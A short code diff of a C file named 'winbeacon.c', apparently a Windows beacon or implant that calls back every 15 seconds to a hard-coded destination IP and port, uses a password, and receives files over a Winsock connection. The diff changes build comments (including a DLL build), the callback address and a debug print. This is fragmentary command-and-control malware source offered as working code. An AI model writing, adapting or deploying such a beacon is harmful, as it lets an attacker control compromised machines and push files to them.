@@ -13,16 +13,16 @@
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
 // WINDOWS GCC COMPILE
-//gcc main.c -o prog -lws2_32
+//gcc winbeacon.c -o prog -lws2_32
 
 // MINGW COMPILE
-//x86_64-w64-mingw32-gcc main.c -o prog.exe -lws2_32
+//x86_64-w64-mingw32-gcc winbeacon.c -o prog.exe -lws2_32
 
 // DEBUG COMPILE
-//gcc main.c -o prog -lws2_32 -g
+//gcc winbeacon.c -o prog -lws2_32 -g
 
 // DLL COMPILE
-//gcc -c main.c
+//gcc -c winbeacon.c
 //gcc -shared -o maindll.dll main.o -lws2_32
 
 // DLL EXECUTE 
@@ -31,7 +31,7 @@
 
 #define EXECUTABLE_NAME "foo.exe"
 #define PASSWORD "password"
-#define DESTINATION_IP "192.168.1.30"
+#define DESTINATION_IP "192.168.217.219"
 #define DESTINATION_PORT 8080
 #define NUM_SECONDS_BETWEEN_CALLBACKS 15
 
@@ -178,8 +178,9 @@ DWORD WINAPI ThreadFunc(void* data) {
 	recv_size = 0;
 	while (recv_size != file_size){
 		recv_size += recv(s, buffer+recv_size, sizeof(file_size), 0);
-		printf("bytes recieved: %i\n", recv_size);
+		//printf("bytes recieved: %i\n", recv_size);
 	}	
+	printf("bytes recieved: %i\n", recv_size);
 	
 	puts("Got File\n");
 	
